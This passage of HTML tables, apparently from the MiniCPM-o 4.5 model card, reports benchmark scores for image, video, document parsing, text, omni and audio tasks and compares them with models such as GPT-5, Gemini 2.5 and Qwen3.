align=\"center\">75.4</td> \n     <td align=\"center\">86.0</td> \n     <td align=\"center\"><ins>86.0</ins></td> \n     <td align=\"center\">71.6</td> \n     <td align=\"center\">76.9</td> \n     <td align=\"center\">72.9</td> \n     <td align=\"center\">70.2</td> \n     <td align=\"center\">57.0</td> \n     <td align=\"center\">86.3</td> \n     <td align=\"center\">822</td> \n     <td align=\"center\">77.4</td> \n     <td align=\"center\">93.0</td> \n     <td align=\"center\">66.7<sup>*</sup></td> \n     <td align=\"center\">64.6</td> \n     <td align=\"center\">70.1<sup>*</sup></td> \n     <td align=\"center\">70.5<sup>*</sup></td> \n     <td align=\"center\">8.1<sup>*</sup></td> \n     <td align=\"center\">4.2<sup>*</sup></td> \n     <td align=\"center\">25.0<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">InternVL-3.5-8B</td> \n     <td align=\"center\">75.8</td> \n     <td align=\"center\">79.5</td> \n     <td align=\"center\">80.0<sup>*</sup></td> \n     <td align=\"center\"><ins>78.4</ins></td> \n     <td align=\"center\"><b>83.1</b></td> \n     <td align=\"center\"><ins>73.4</ins></td> \n     <td align=\"center\">69.3</td> \n     <td align=\"center\">54.5</td> \n     <td align=\"center\">84.0</td> \n     <td align=\"center\">840</td> \n     <td align=\"center\">78.2</td> \n     <td align=\"center\">92.3</td> \n     <td align=\"center\">66.7</td> \n     <td align=\"center\">56.3<sup>*</sup></td> \n     <td align=\"center\">70.5</td> \n     <td align=\"center\">55.8</td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">3.8<sup>*</sup></td> \n     <td align=\"center\">34.7<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Qwen3-VL-8B-Instruct</td> \n     <td align=\"center\">76.5</td> \n     <td align=\"center\">84.5</td> \n     <td align=\"center\">84.7</td> \n     <td align=\"center\">77.2</td> \n     <td align=\"center\">73.7<sup>*</sup></td> \n     <td align=\"center\">69.6</td> \n     <td align=\"center\">70.9</td> \n     <td align=\"center\"><ins>61.1</ins></td> \n     <td align=\"center\">85.7</td> \n     <td align=\"center\"><b>896</b></td> \n     <td align=\"center\">82.9<sup>*</sup></td> \n     <td align=\"center\"><b>96.1</b></td> \n     <td align=\"center\">60.9<sup>*</sup></td> \n     <td align=\"center\">59.4<sup>*</sup></td> \n     <td align=\"center\">74.2<sup>*</sup></td> \n     <td align=\"center\">64.4</td> \n     <td align=\"center\">11.3<sup>*</sup></td> \n     <td align=\"center\"><b>4.7<sup>*</sup></b></td> \n     <td align=\"center\">29.9<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Qwen3-Omni-30B-A3B-Instruct</td> \n     <td align=\"center\">75.7</td> \n     <td align=\"center\">84.9<sup>*</sup></td> \n     <td align=\"center\">84.1<sup>*</sup></td> \n     <td align=\"center\">75.9</td> \n     <td align=\"center\">74.8<sup>*</sup></td> \n     <td align=\"center\">69.1</td> \n     <td align=\"center\">68.5</td> \n     <td align=\"center\">59.7</td> \n     <td align=\"center\">85.2</td> \n     <td align=\"center\"><ins>880</ins><sup>*</sup></td> \n     <td align=\"center\"><b>84.1<sup>*</sup></b></td> \n     <td align=\"center\"><ins>95.4</ins><sup>*</sup></td> \n     <td align=\"center\"><b>70.4<sup>*</sup></b></td> \n     <td align=\"center\">65.7<sup>*</sup></td> \n     <td align=\"center\"><ins>78.3</ins><sup>*</sup></td> \n     <td align=\"center\">61.9<sup>*</sup></td> \n     <td align=\"center\"><ins>14.2</ins><sup>*</sup></td> \n     <td align=\"center\"><ins>4.6</ins><sup>*</sup></td> \n     <td align=\"center\">31.6<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o 4.5-Instruct</td> \n     <td align=\"center\"><ins>77.6</ins></td> \n     <td align=\"center\"><b>87.6</b></td> \n     <td align=\"center\"><b>87.2</b></td> \n     <td align=\"center\"><b>80.1</b></td> \n     <td align=\"center\">74.4</td> \n     <td align=\"center\">67.6</td> \n     <td align=\"center\"><ins>73.1</ins></td> \n     <td align=\"center\"><b>63.2</b></td> \n     <td align=\"center\"><ins>87.6</ins></td> \n     <td align=\"center\">876</td> \n     <td align=\"center\"><ins>83.8</ins></td> \n     <td align=\"center\">94.7</td> \n     <td align=\"center\">69.7</td> \n     <td align=\"center\"><ins>66.3</ins></td> \n     <td align=\"center\"><b>79.7</b></td> \n     <td align=\"center\"><ins>72.0</ins></td> \n     <td align=\"center\"><b>16.6</b></td> \n     <td align=\"center\"><b>4.7</b></td> \n     <td align=\"center\"><ins>24.3</ins></td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n <p><strong>Image Understanding (Thinking)</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\"><b>Model</b></th> \n     <th nowrap=\"nowrap\"><b>OpenCompass</b></th> \n     <th nowrap=\"nowrap\"><b>MMBench EN v1.1</b></th> \n     <th nowrap=\"nowrap\"><b>MMBench CN v1.1</b></th> \n     <th nowrap=\"nowrap\"><b>MathVista</b></th> \n     <th nowrap=\"nowrap\"><b>MMVet</b></th> \n     <th nowrap=\"nowrap\"><b>MMMU</b></th> \n     <th nowrap=\"nowrap\"><b>MMStar</b></th> \n     <th nowrap=\"nowrap\"><b>HallusionBench</b></th> \n     <th nowrap=\"nowrap\"><b>AI2D</b></th> \n     <th nowrap=\"nowrap\"><b>OCRBench</b></th> \n     <th nowrap=\"nowrap\"><b>TextVQA_VAL</b></th> \n     <th nowrap=\"nowrap\"><b>DocVQA_VAL</b></th> \n     <th nowrap=\"nowrap\"><b>MMT-Bench_VAL</b></th> \n     <th nowrap=\"nowrap\"><b>MM-IFEval</b></th> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Gemini2.5-Flash-Thinking</td> \n     <td align=\"center\"><b>79.9</b></td> \n     <td align=\"center\">87.1</td> \n     <td align=\"center\">87.3</td> \n     <td align=\"center\">79.4</td> \n     <td align=\"center\"><b>81.2<sup>*</sup></b></td> \n     <td align=\"center\"><ins>77.7</ins></td> \n     <td align=\"center\"><b>76.5</b></td> \n     <td align=\"center\">63.5</td> \n     <td align=\"center\"><ins>88.7</ins></td> \n     <td align=\"center\">853</td> \n     <td align=\"center\">73.8<sup>*</sup></td> \n     <td align=\"center\">92.8</td> \n     <td align=\"center\">70.7<sup>*</sup></td> \n     <td align=\"center\"><ins>75.7</ins><sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">GPT-5</td> \n     <td align=\"center\"><ins>79.7</ins></td> \n     <td align=\"center\">85.5<sup>*</sup></td> \n     <td align=\"center\">85.6<sup>*</sup></td> \n     <td align=\"center\"><b>81.9</b></td> \n     <td align=\"center\"><ins>77.6</ins></td> \n     <td align=\"center\"><b>81.8</b></td> \n     <td align=\"center\"><ins>75.7</ins></td> \n     <td align=\"center\"><ins>65.2</ins></td> \n     <td align=\"center\"><b>89.5</b></td> \n     <td align=\"center\">807</td> \n     <td align=\"center\">77.8<sup>*</sup></td> \n     <td align=\"center\">91.3<sup>*</sup></td> \n     <td align=\"center\"><b>72.7<sup>*</sup></b></td> \n     <td align=\"center\"><b>83.1<sup>*</sup></b></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Qwen3-VL-8B-Thinking</td> \n     <td align=\"center\">77.3</td> \n     <td align=\"center\">85.3</td> \n     <td align=\"center\">85.5</td> \n     <td align=\"center\"><ins>81.4</ins></td> \n     <td align=\"center\">69.8<sup>*</sup></td> \n     <td align=\"center\">74.1</td> \n     <td align=\"center\">75.3</td> \n     <td align=\"center\"><b>65.4</b></td> \n     <td align=\"center\">84.9</td> \n     <td align=\"center\">819</td> \n     <td align=\"center\">77.8<sup>*</sup></td> \n     <td align=\"center\"><b>95.3</b></td> \n     <td align=\"center\">68.1<sup>*</sup></td> \n     <td align=\"center\">73.5<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Qwen3-Omni-30B-A3B-Thinking</td> \n     <td align=\"center\">78.5</td> \n     <td align=\"center\"><ins>88.2</ins><sup>*</sup></td> \n     <td align=\"center\"><b>87.7<sup>*</sup></b></td> \n     <td align=\"center\">80.0</td> \n     <td align=\"center\">74.8<sup>*</sup></td> \n     <td align=\"center\">75.6</td> \n     <td align=\"center\">74.9</td> \n     <td align=\"center\">62.8</td> \n     <td align=\"center\">86.1</td> \n     <td align=\"center\"><ins>859</ins><sup>*</sup></td> \n     <td align=\"center\"><b>80.8<sup>*</sup></b></td> \n     <td align=\"center\"><ins>94.2</ins><sup>*</sup></td> \n     <td align=\"center\"><ins>70.9</ins><sup>*</sup></td> \n     <td align=\"center\">69.9<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o 4.5-Thinking</td> \n     <td align=\"center\">78.2</td> \n     <td align=\"center\"><b>89.0</b></td> \n     <td align=\"center\"><ins>87.6</ins></td> \n     <td align=\"center\">81.0</td> \n     <td align=\"center\">73.6</td> \n     <td align=\"center\">70.2</td> \n     <td align=\"center\">73.6</td> \n     <td align=\"center\">62.6</td> \n     <td align=\"center\">88.5</td> \n     <td align=\"center\"><b>879</b></td> \n     <td align=\"center\"><ins>79.8</ins></td> \n     <td align=\"center\">92.3</td> \n     <td align=\"center\">69.7</td> \n     <td align=\"center\">68.2</td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n <p><strong>Video Understanding</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\"><b>Model</b></th> \n     <th nowrap=\"nowrap\"><b>Video-MME<br />(w/o subs)</b></th> \n     <th nowrap=\"nowrap\"><b>LVBench</b></th> \n     <th nowrap=\"nowrap\"><b>MLVU<br />(M-Avg)</b></th> \n     <th nowrap=\"nowrap\"><b>LongVideoBench<br />(val)</b></th> \n     <th nowrap=\"nowrap\"><b>MotionBench</b></th> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Gemini2.5-Flash-Nonthinking</td> \n     <td align=\"center\"><b>75.6</b></td> \n     <td align=\"center\"><b>62.2</b></td> \n     <td align=\"center\"><b>77.8</b></td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">-</td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">InternVL-3.5-8B</td> \n     <td align=\"center\">66.0</td> \n     <td align=\"center\">-</td> \n     <td align=\"center\">70.2</td> \n     <td align=\"center\">62.1</td> \n     <td align=\"center\"><b>62.3<sup>*</sup></b></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Qwen3-Omni-30B-A3B-Instruct</td> \n     <td align=\"center\"><ins>70.5</ins></td> \n     <td align=\"center\">50.2</td> \n     <td align=\"center\">75.2</td> \n     <td align=\"center\"><b>66.9<sup>*</sup></b></td> \n     <td align=\"center\"><ins>61.7</ins><sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o 4.5-Instruct</td> \n     <td align=\"center\">70.4</td> \n     <td align=\"center\"><ins>50.9</ins></td> \n     <td align=\"center\"><ins>76.5</ins></td> \n     <td align=\"center\"><ins>66.0</ins></td> \n     <td align=\"center\">61.4</td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n</details> \n<details> \n Click to view document parsing results. \n <p><strong>OmniDocBench</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\" rowspan=\"2\"><b>Method Type</b></th> \n     <th nowrap=\"nowrap\" rowspan=\"2\"><b>Methods</b></th> \n     <th colspan=\"2\" nowrap=\"nowrap\"><b>OverallEdit↓</b></th> \n     <th colspan=\"2\" nowrap=\"nowrap\"><b>TextEdit↓</b></th> \n     <th colspan=\"2\" nowrap=\"nowrap\"><b>FormulaEdit↓</b></th> \n     <th colspan=\"2\" nowrap=\"nowrap\"><b>TableTEDS↑</b></th> \n     <th colspan=\"2\" nowrap=\"nowrap\"><b>TableEdit↓</b></th> \n     <th colspan=\"2\" nowrap=\"nowrap\"><b>Read OrderEdit↓</b></th> \n    </tr> \n    <tr> \n     <th nowrap=\"nowrap\"><b>EN</b></th> \n     <th nowrap=\"nowrap\"><b>ZH</b></th> \n     <th nowrap=\"nowrap\"><b>EN</b></th> \n     <th nowrap=\"nowrap\"><b>ZH</b></th> \n     <th nowrap=\"nowrap\"><b>EN</b></th> \n     <th nowrap=\"nowrap\"><b>ZH</b></th> \n     <th nowrap=\"nowrap\"><b>EN</b></th> \n     <th nowrap=\"nowrap\"><b>ZH</b></th> \n     <th nowrap=\"nowrap\"><b>EN</b></th> \n     <th nowrap=\"nowrap\"><b>ZH</b></th> \n     <th nowrap=\"nowrap\"><b>EN</b></th> \n     <th nowrap=\"nowrap\"><b>ZH</b></th> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\" rowspan=\"2\">Pipeline</td> \n     <td align=\"center\" nowrap=\"nowrap\">MinerU 2.5</td> \n     <td align=\"center\">0.117<sup>*</sup></td> \n     <td align=\"center\">0.172<sup>*</sup></td> \n     <td align=\"center\">0.051<sup>*</sup></td> \n     <td align=\"center\">0.08<sup>*</sup></td> \n     <td align=\"center\"><ins>0.256</ins><sup>*</sup></td> \n     <td align=\"center\">0.455<sup>*</sup></td> \n     <td align=\"center\">85.9<sup>*</sup></td> \n     <td align=\"center\">89.4<sup>*</sup></td> \n     <td align=\"center\">0.115<sup>*</sup></td> \n     <td align=\"center\">0.081<sup>*</sup></td> \n     <td align=\"center\">0.047<sup>*</sup></td> \n     <td align=\"center\">0.072<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"center\" nowrap=\"nowrap\">PaddleOCR-VL</td> \n     <td align=\"center\"><b>0.105</b></td> \n     <td align=\"center\"><ins>0.126</ins></td> \n     <td align=\"center\"><ins>0.041</ins></td> \n     <td align=\"center\"><b>0.062</b></td> \n     <td align=\"center\"><b>0.241</b></td> \n     <td align=\"center\"><b>0.316</b></td> \n     <td align=\"center\">88</td> \n     <td align=\"center\"><ins>92.1</ins></td> \n     <td align=\"center\"><ins>0.093</ins></td> \n     <td align=\"center\"><ins>0.062</ins></td> \n     <td align=\"center\">0.045</td> \n     <td align=\"center\"><ins>0.063</ins></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n     <td align=\"center\"></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\" rowspan=\"11\">End-to-end Model</td> \n     <td align=\"center\" nowrap=\"nowrap\">Qwen2.5-VL-72B</td> \n     <td align=\"center\">0.214</td> \n     <td align=\"center\">0.261</td> \n     <td align=\"center\">0.092</td> \n     <td align=\"center\">0.18</td> \n     <td align=\"center\">0.315</td> \n     <td align=\"center\">0.434</td> \n     <td align=\"center\">82.9</td> \n     <td align=\"center\">83.9</td> \n     <td align=\"center\">0.341</td> \n     <td align=\"center\">0.262</td> \n     <td align=\"center\">0.106</td> \n     <td align=\"center\">0.168</td> \n    </tr> \n    <tr> \n     <td align=\"center\" nowrap=\"nowrap\">GPT 5</td> \n     <td align=\"center\">0.218<sup>*</sup></td> \n     <td align=\"center\">0.33<sup>*</sup></td> \n     <td align=\"center\">0.139<sup>*</sup></td> \n     <td align=\"center\">0.344<sup>*</sup></td> \n     <td align=\"center\">0.396<sup>*</sup></td> \n     <td align=\"center\">0.555<sup>*</sup></td> \n     <td align=\"center\">77.55<sup>*</sup></td> \n     <td align=\"center\">73.09<sup>*</sup></td> \n     <td align=\"center\">0.188<sup>*</sup></td> \n     <td align=\"center\">0.196<sup>*</sup></td> \n     <td align=\"center\">0.151<sup>*</sup></td> \n     <td align=\"center\">0.227<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"center\" nowrap=\"nowrap\">Gemini2.5-Flash-Nonthinking</td> \n     <td align=\"center\">0.214<sup>*</sup></td> \n     <td align=\"center\">0.29<sup>*</sup></td> \n     <td align=\"center\">0.159<sup>*</sup></td> \n     <td align=\"center\">0.273<sup>*</sup></td> \n     <td align=\"center\">0.368<sup>*</sup></td> \n     <td align=\"center\">0.524<sup>*</sup></td> \n     <td align=\"center\">80.9<sup>*</sup></td> \n     <td align=\"center\">85.5<sup>*</sup></td> \n     <td align=\"center\">0.197<sup>*</sup></td> \n     <td align=\"center\">0.167<sup>*</sup></td> \n     <td align=\"center\">0.132<sup>*</sup></td> \n     <td align=\"center\">0.195<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"center\" nowrap=\"nowrap\">Gemini-2.5-Pro-Nonthinking</td> \n     <td align=\"center\">0.148<sup>*</sup></td> \n     <td align=\"center\">0.212<sup>*</sup></td> \n     <td align=\"center\">0.055<sup>*</sup></td> \n     <td align=\"center\">0.168<sup>*</sup></td> \n     <td align=\"center\">0.356<sup>*</sup></td> \n     <td align=\"center\">0.439<sup>*</sup></td> \n     <td align=\"center\">85.8<sup>*</sup></td> \n     <td align=\"center\">86.4<sup>*</sup></td> \n     <td align=\"center\">0.13<sup>*</sup></td> \n     <td align=\"center\">0.119<sup>*</sup></td> \n     <td align=\"center\">0.049<sup>*</sup></td> \n     <td align=\"center\">0.121<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"center\" nowrap=\"nowrap\">Gemini-3 Flash-Nonthinking</td> \n     <td align=\"center\">0.155<sup>*</sup></td> \n     <td align=\"center\">0.201<sup>*</sup></td> \n     <td align=\"center\">0.138<sup>*</sup></td> \n     <td align=\"center\">0.255<sup>*</sup></td> \n     <td align=\"center\">0.297<sup>*</sup></td> \n     <td align=\"center\">0.351<sup>*</sup></td> \n     <td align=\"center\">86.4<sup>*</sup></td> \n     <td align=\"center\">89.8<sup>*</sup></td> \n     <td align=\"center\">0.116<sup>*</sup></td> \n     <td align=\"center\">0.1<sup>*</sup></td> \n     <td align=\"center\">0.072<sup>*</sup></td> \n     <td align=\"center\">0.099<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"center\" nowrap=\"nowrap\">doubao-1-5-thinking-vision-pro-250428</td> \n     <td align=\"center\">0.14</td> \n     <td align=\"center\">0.162</td> \n     <td align=\"center\">0.043</td> \n     <td align=\"center\">0.085</td> \n     <td align=\"center\">0.295</td> \n     <td align=\"center\">0.384</td> \n     <td align=\"center\">83.3</td> \n     <td align=\"center\">89.3</td> \n     <td align=\"center\">0.165</td> \n     <td align=\"center\">0.085</td> \n     <td align=\"center\">0.058</td> \n     <td align=\"center\">0.094</td> \n    </tr> \n    <tr> \n     <td align=\"center\" nowrap=\"nowrap\">dots.ocr</td> \n     <td align=\"center\">0.125</td> \n     <td align=\"center\">0.16</td> \n     <td align=\"center\"><b>0.032</b></td> \n     <td align=\"center\"><ins>0.066</ins></td> \n     <td align=\"center\">0.329</td> \n     <td align=\"center\">0.416</td> \n     <td align=\"center\"><ins>88.6</ins></td> \n     <td align=\"center\">89</td> \n     <td align=\"center\">0.099</td> \n     <td align=\"center\">0.092</td> \n     <td align=\"center\"><ins>0.04</ins></td> \n     <td align=\"center\">0.067</td> \n    </tr> \n    <tr> \n     <td align=\"center\" nowrap=\"nowrap\">HunyuanOCR</td> \n     <td align=\"center\">0.12<sup>*</sup></td> \n     <td align=\"center\"><b>0.125<sup>*</sup></b></td> \n     <td align=\"center\">0.046<sup>*</sup></td> \n     <td align=\"center\">0.071<sup>*</sup></td> \n     <td align=\"center\">0.288<sup>*</sup></td> \n     <td align=\"center\"><ins>0.33</ins><sup>*</sup></td> \n     <td align=\"center\"><b>89.6<sup>*</sup></b></td> \n     <td align=\"center\"><b>94.4<sup>*</sup></b></td> \n     <td align=\"center\"><b>0.089<sup>*</sup></b></td> \n     <td align=\"center\"><b>0.045<sup>*</sup></b></td> \n     <td align=\"center\">0.055<sup>*</sup></td> \n     <td align=\"center\"><b>0.056<sup>*</sup></b></td> \n    </tr> \n    <tr> \n     <td align=\"center\" nowrap=\"nowrap\">DeepSeek-OCR 2</td> \n     <td align=\"center\">0.119<sup>*</sup></td> \n     <td align=\"center\">0.146<sup>*</sup></td> \n     <td align=\"center\"><ins>0.041</ins><sup>*</sup></td> \n     <td align=\"center\">0.08<sup>*</sup></td> \n     <td align=\"center\"><ins>0.256</ins><sup>*</sup></td> \n     <td align=\"center\">0.345<sup>*</sup></td> \n     <td align=\"center\">82.6<sup>*</sup></td> \n     <td align=\"center\">89.9<sup>*</sup></td> \n     <td align=\"center\">0.123<sup>*</sup></td> \n     <td align=\"center\">0.078<sup>*</sup></td> \n     <td align=\"center\">0.055<sup>*</sup></td> \n     <td align=\"center\">0.081<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"center\" nowrap=\"nowrap\">Qwen3-Omni-30B-A3B-Instruct</td> \n     <td align=\"center\">0.216<sup>*</sup></td> \n     <td align=\"center\">0.363<sup>*</sup></td> \n     <td align=\"center\">0.128<sup>*</sup></td> \n     <td align=\"center\">0.337<sup>*</sup></td> \n     <td align=\"center\">0.402<sup>*</sup></td> \n     <td align=\"center\">0.529<sup>*</sup></td> \n     <td align=\"center\">77.3<sup>*</sup></td> \n     <td align=\"center\">71.8<sup>*</sup></td> \n     <td align=\"center\">0.181<sup>*</sup></td> \n     <td align=\"center\">0.255<sup>*</sup></td> \n     <td align=\"center\">0.152<sup>*</sup></td> \n     <td align=\"center\">0.332<sup>*</sup></td> \n    </tr> \n    <tr> \n     <td align=\"center\" nowrap=\"nowrap\">MiniCPM-o 4.5-Instruct</td> \n     <td align=\"center\"><ins>0.109</ins></td> \n     <td align=\"center\">0.162</td> \n     <td align=\"center\">0.046</td> \n     <td align=\"center\">0.078</td> \n     <td align=\"center\">0.257</td> \n     <td align=\"center\">0.41</td> \n     <td align=\"center\">86.8</td> \n     <td align=\"center\">88.9</td> \n     <td align=\"center\">0.097</td> \n     <td align=\"center\">0.084</td> \n     <td align=\"center\"><b>0.037</b></td> \n     <td align=\"center\">0.074</td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n</details> \n<details> \n Click to view text capability results. \n <p><strong>Text Capability</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\"><b>Model</b></th> \n     <th nowrap=\"nowrap\"><b>IFEval-PLS</b></th> \n     <th nowrap=\"nowrap\"><b>BBH</b></th> \n     <th nowrap=\"nowrap\"><b>CMMLU</b></th> \n     <th nowrap=\"nowrap\"><b>MMLU</b></th> \n     <th nowrap=\"nowrap\"><b>HumanEval</b></th> \n     <th nowrap=\"nowrap\"><b>MBPP</b></th> \n     <th nowrap=\"nowrap\"><b>Math500</b></th> \n     <th nowrap=\"nowrap\"><b>GSM8K</b></th> \n     <th nowrap=\"nowrap\"><b>Avg</b></th> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Qwen3-8B-Instruct</td> \n     <td align=\"center\">83.0<sup>*</sup></td> \n     <td align=\"center\">69.4<sup>*</sup></td> \n     <td align=\"center\">78.7<sup>*</sup></td> \n     <td align=\"center\"><b>81.7<sup>*</sup></b></td> \n     <td align=\"center\"><b>86.6<sup>*</sup></b></td> \n     <td align=\"center\">75.9<sup>*</sup></td> \n     <td align=\"center\"><b>84.0<sup>*</sup></b></td> \n     <td align=\"center\">93.4<sup>*</sup></td> \n     <td align=\"center\">81.6</td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o 4.5-Instruct</td> \n     <td align=\"center\"><b>84.7</b></td> \n     <td align=\"center\"><b>81.1</b></td> \n     <td align=\"center\"><b>79.5</b></td> \n     <td align=\"center\">77.0</td> \n     <td align=\"center\"><b>86.6</b></td> \n     <td align=\"center\"><b>76.7</b></td> \n     <td align=\"center\">77.0</td> \n     <td align=\"center\"><b>94.5</b></td> \n     <td align=\"center\"><b>82.1</b></td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n</details> \n<details> \n Click to view omni simplex results. \n <p><strong>Omni Simplex</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\"><b>Model</b></th> \n     <th nowrap=\"nowrap\"><b>Daily-Omni</b></th> \n     <th nowrap=\"nowrap\"><b>WorldSense</b></th> \n     <th nowrap=\"nowrap\"><b>Video-Holmes</b></th> \n     <th nowrap=\"nowrap\"><b>JointAVBench</b></th> \n     <th nowrap=\"nowrap\"><b>AVUT-Human</b></th> \n     <th nowrap=\"nowrap\"><b>FutureOmni</b></th> \n     <th nowrap=\"nowrap\"><b>Video-MME-Short<br />(w/ audio)</b></th> \n     <th nowrap=\"nowrap\">Avg</th> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Gemini2.5-Flash-Nonthinking</td> \n     <td align=\"center\"><ins>79.3</ins><sup>*</sup></td> \n     <td align=\"center\">52.6<sup>*</sup></td> \n     <td align=\"center\"><ins>51.3</ins><sup>*</sup></td> \n     <td align=\"center\"><ins>55.6</ins><sup>*</sup></td> \n     <td align=\"center\">65.4<sup>*</sup></td> \n     <td align=\"center\">55.6<sup>*</sup></td> \n     <td align=\"center\"><b>85.5<sup>*</sup></b></td> \n     <td align=\"center\">63.6</td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">Qwen3-Omni-30B-A3B-Instruct</td> \n     <td align=\"center\">70.7<sup>*</sup></td> \n     <td align=\"center\"><ins>54.0</ins></td> \n     <td align=\"center\">50.4<sup>*</sup></td> \n     <td align=\"center\">53.1</td> \n     <td align=\"center\"><ins>74.2</ins><sup>*</sup></td> \n     <td align=\"center\"><b>62.1</b></td> \n     <td align=\"center\">81.3<sup>*</sup></td> \n     <td align=\"center\"><ins>63.7</ins></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o 4.5-Instruct</td> \n     <td align=\"center\"><b>80.2</b></td> \n     <td align=\"center\"><b>55.7</b></td> \n     <td align=\"center\"><b>64.3</b></td> \n     <td align=\"center\"><b>60.0</b></td> \n     <td align=\"center\"><b>78.6</b></td> \n     <td align=\"center\"><ins>56.1</ins></td> \n     <td align=\"center\"><ins>84.7</ins></td> \n     <td align=\"center\"><b>68.5</b></td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n</details> \n<details> \n Click to view vision duplex results. \n <p><strong>Vision Duplex</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\"><b>Model</b></th> \n     <th nowrap=\"nowrap\"><b>LiveSports-3K-CC<br />(Win Rate vs GPT4o)</b></th> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">LiveCC-7B-Instruct</td> \n     <td align=\"center\">41.5</td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">StreamingVLM</td> \n     <td align=\"center\"><ins>45.6</ins></td> \n    </tr> \n    <tr> \n     <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o 4.5-Instruct</td> \n     <td align=\"center\"><b>54.4</b></td> \n    </tr> \n   </tbody>\n  </table> \n </div> \n</details> \n<details> \n Click to view audio understanding results. \n <p><strong>Audio Understanding</strong></p> \n <div align=\"center\"> \n  <table style=\"margin: 0px auto;\"> \n   <tbody>\n    <tr> \n     <th align=\"left\" nowrap=\"nowrap\" rowspan=\"2\"><b>Model</b></th> \n     <th colspan=\"4\" nowrap=\"nowrap\"><b>ASR-ZH<br />CER↓</b></th> \n     <th colspan=\"4\" nowrap=\"nowrap\"><b>ASR-EN<br />WER↓</b></th> \n     <th colspan=\"2\" nowrap=\"nowrap\"><b>AST</b></th> \n     <th colspan=\"2\" nowrap=\"nowrap\"><b>MultiTask</b></th> \n     <th colspan=\"4\" nowrap=\"nowrap\"><b>SpeechQA</b></th> \n    </tr> \n    <tr> \n     <th nowrap=\"nowrap\"><b>AISHELL-1</b></th> \n     <th nowrap=\"nowrap\"><b>AISHELL-2</b></th> \n     <th nowrap=\"nowrap\"><b>WenetSpeech test-net</b></th> \n     <th nowrap=\"nowrap\"><b>WenetSpeech test-meeting</b></th> \n     <th nowrap=\"nowrap\"><b>LibriSpeech test-clean</b></th> \n     <th nowrap=\"nowrap\"><b>LibriSpeech <br />test-other</b></th> \n     <th nowrap=\"nowrap\"><b>GigaSpeech test</b></th> \n     <th nowrap=\"nowrap\"><b>VoxPopuli-V1-En</b></th> \n     <th nowrap=\"nowrap\"><b>CoVoST 2 en2zh</b></th> \n     <th nowrap=\"nowrap\"><b>CoVoST 2 zh2en</b></th> \n     <th nowrap=\"nowrap\"><b>MMAU</b></th> \n     <th nowrap=\"nowrap\"><b>Meld</b></th> \n     <th nowrap=\"nowrap\"><b>VoiceBench <br />AlpacaEval</b></th> \n     <th nowrap=\"nowrap\"><b>Speech TriviaQA</b></th> \n     <th nowrap=\"nowrap\"><b>Speech <br />Web Questions</b></th> \n     <th nowrap=\"nowrap\"><b>Speech CMMLU</b></th> \n    </tr> \n    <tr> 